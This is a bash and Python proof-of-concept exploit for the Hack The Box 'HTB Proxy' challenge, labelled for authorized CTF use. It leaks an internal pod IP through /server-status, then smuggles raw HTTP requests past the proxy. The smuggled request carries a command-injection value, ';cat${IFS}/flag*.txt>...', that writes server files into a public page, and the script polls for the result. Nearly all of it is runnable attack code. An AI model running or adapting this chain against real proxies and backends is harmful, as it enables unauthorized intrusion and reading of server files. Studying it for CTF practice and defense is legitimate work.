#!/usr/bin/env bash

set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - HTB Proxy
# Type: Request smuggling + backend command injection chain
#
# This script is intended for authorized CTF infrastructure only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly DEFAULT_TIMEOUT=5
readonly DEFAULT_SEND_RETRIES=5
readonly DEFAULT_FETCH_RETRIES=12
readonly DEFAULT_SLEEP=0.5
readonly DEFAULT_INJECT=';cat${IFS}/flag*.txt>/app/proxy/includes/index.html'

PROXY_IP=""
PROXY_PORT=""
POD_IP=""
TIMEOUT="${DEFAULT_TIMEOUT}"
SEND_RETRIES="${DEFAULT_SEND_RETRIES}"
FETCH_RETRIES="${DEFAULT_FETCH_RETRIES}"
SLEEP_INTERVAL="${DEFAULT_SLEEP}"
INJECT_CMD="${DEFAULT_INJECT}"
JSON_OUTPUT=0
VERBOSE=0

usage() {
  cat <<EOF
Usage:
  ${SCRIPT_NAME} <proxy_ip> <proxy_port> [pod_ip]
  ${SCRIPT_NAME} --proxy-ip <ip> --proxy-port <port> [options]

Options:
  --proxy-ip <ip>         Public proxy IP/host
  --proxy-port <port>     Public proxy port
  --pod-ip <ip>           Internal pod IP override (auto-detected if omitted)
  --inject <cmd>          Injection command for interface parameter
  --timeout <seconds>     Socket timeout (default: ${DEFAULT_TIMEOUT})
  --send-retries <n>      Number of smuggle sends (default: ${DEFAULT_SEND_RETRIES})
  --fetch-retries <n>     Homepage polling attempts (default: ${DEFAULT_FETCH_RETRIES})
  --sleep <seconds>       Delay between attempts (default: ${DEFAULT_SLEEP})
  --json                  Print result as JSON
  --verbose               Enable verbose debug output
  -h, --help              Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity/request failure
  4  Pod IP detection failed
  5  Exploit sent but flag not observed
EOF
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_ok() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[+] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

parse_args() {
  local positional=()
  while [[ $# -gt 0 ]]; do
    case "$1" in
      --proxy-ip)
        PROXY_IP="${2:-}"
        shift 2
        ;;
      --proxy-port)
        PROXY_PORT="${2:-}"
        shift 2
        ;;
      --pod-ip)
        POD_IP="${2:-}"
        shift 2
        ;;
      --inject)
        INJECT_CMD="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --send-retries)
        SEND_RETRIES="${2:-}"
        shift 2
        ;;
      --fetch-retries)
        FETCH_RETRIES="${2:-}"
        shift 2
        ;;
      --sleep)
        SLEEP_INTERVAL="${2:-}"
        shift 2
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -*)
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${PROXY_IP}" && ${#positional[@]} -ge 1 ]]; then
    PROXY_IP="${positional[0]}"
  fi
  if [[ -z "${PROXY_PORT}" && ${#positional[@]} -ge 2 ]]; then
    PROXY_PORT="${positional[1]}"
  fi
  if [[ -z "${POD_IP}" && ${#positional[@]} -ge 3 ]]; then
    POD_IP="${positional[2]}"
  fi

  if [[ -z "${PROXY_IP}" || -z "${PROXY_PORT}" ]]; then
    log_error "Proxy IP and port are required."
    usage >&2
    exit 2
  fi
}

validate_input() {
  if ! [[ "${PROXY_PORT}" =~ ^[0-9]+$ ]] || (( PROXY_PORT < 1 || PROXY_PORT > 65535 )); then
    log_error "Invalid proxy port: ${PROXY_PORT}"
    exit 2
  fi
  if ! [[ "${SEND_RETRIES}" =~ ^[0-9]+$ ]] || (( SEND_RETRIES < 1 )); then
    log_error "send-retries must be >= 1"
    exit 2
  fi
  if ! [[ "${FETCH_RETRIES}" =~ ^[0-9]+$ ]] || (( FETCH_RETRIES < 1 )); then
    log_error "fetch-retries must be >= 1"
    exit 2
  fi
}

detect_pod_ip() {
  python3 - "$PROXY_IP" "$PROXY_PORT" "$TIMEOUT" <<'PY'
import re
import socket
import sys

host = sys.argv[1]
port = int(sys.argv[2])
timeout = float(sys.argv[3])

try:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, port))
    s.sendall(b"GET /server-status HTTP/1.1\r\nHost: x:1\r\nConnection: close\r\n\r\n")
    data = b""
    while True:
        try:
            c = s.recv(4096)
        except socket.timeout:
            break
        if not c:
            break
        data += c
finally:
    try:
        s.close()
    except Exception:
        pass

text = data.decode("latin1", "ignore")
m = re.search(r"(10\.\d+\.\d+\.\d+)", text)
if m:
    print(m.group(1))
PY
}

send_smuggle() {
  local backend_host="$1"
  local second_body="$2"
  python3 - "$PROXY_IP" "$PROXY_PORT" "$backend_host" "$second_body" "$TIMEOUT" <<'PY'
import socket
import sys

proxy_ip = sys.argv[1]
proxy_port = int(sys.argv[2])
backend_host = sys.argv[3]
second_body = sys.argv[4]
timeout = float(sys.argv[5])

smuggled = (
    "POST /flushInterface HTTP/1.1\r\n"
    f"Host: {backend_host}\r\n"
    "Content-Type: application/json\r\n"
    f"Content-Length: {len(second_body)}\r\n"
    "\r\n"
    f"{second_body}"
)

outer = (
    "POST /getAddresses HTTP/1.1\r\n"
    f"Host: {backend_host}\r\n"
    "Content-Length: 0\r\n"
    "Content-Type: application/json\r\n"
    "\r\n\r\n\r\n"
    f"{smuggled}"
).encode()

s = socket.socket()
s.settimeout(timeout)
s.connect((proxy_ip, proxy_port))
s.sendall(outer)
s.close()
PY
}

fetch_flag() {
  python3 - "$PROXY_IP" "$PROXY_PORT" "$TIMEOUT" <<'PY'
import re
import socket
import sys

proxy_ip = sys.argv[1]
proxy_port = int(sys.argv[2])
timeout = float(sys.argv[3])

s = socket.socket()
s.settimeout(timeout)
s.connect((proxy_ip, proxy_port))
s.sendall(b"GET / HTTP/1.1\r\nHost: x:1\r\nConnection: close\r\n\r\n")

response = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        response += chunk
except Exception:
    pass
finally:
    s.close()

text = response.decode("latin1", "ignore")
match = re.search(r"HTB\{[^}]+\}", text)
if match:
    print(match.group(0))
PY
}

main() {
  parse_args "$@"
  validate_input

  if [[ -z "${POD_IP}" ]]; then
    log_info "Detecting internal pod IP from /server-status..."
    POD_IP="$(detect_pod_ip || true)"
    if [[ -z "${POD_IP}" ]]; then
      log_error "Failed to detect pod IP."
      exit 4
    fi
  fi

  local backend_host second_body flag
  backend_host="${POD_IP//./-}.default.pod.cluster.local:5000"
  second_body='{"interface": "'"${INJECT_CMD}"'"}'

  log_info "Target proxy: ${PROXY_IP}:${PROXY_PORT}"
  log_info "Backend host override: ${backend_host}"
  log_debug "Injection command: ${INJECT_CMD}"

  for ((i=1; i<=SEND_RETRIES; i++)); do
    send_smuggle "${backend_host}" "${second_body}" || true
    log_debug "Smuggle sent (${i}/${SEND_RETRIES})"
    sleep "${SLEEP_INTERVAL}"
  done

  for ((i=1; i<=FETCH_RETRIES; i++)); do
    flag="$(fetch_flag || true)"
    if [[ "${flag}" == HTB\{* ]]; then
      if [[ "${JSON_OUTPUT}" -eq 1 ]]; then
        printf '{"proxy":"%s:%s","pod_ip":"%s","flag":"%s"}\n' "${PROXY_IP}" "${PROXY_PORT}" "${POD_IP}" "${flag}"
      else
        log_ok "Flag extracted successfully."
        printf '%s\n' "${flag}"
      fi
      exit 0
    fi
    sleep "${SLEEP_INTERVAL}"
  done

  log_error "Exploit sent, but flag was not observed yet."
  exit 5
}

main "$@"
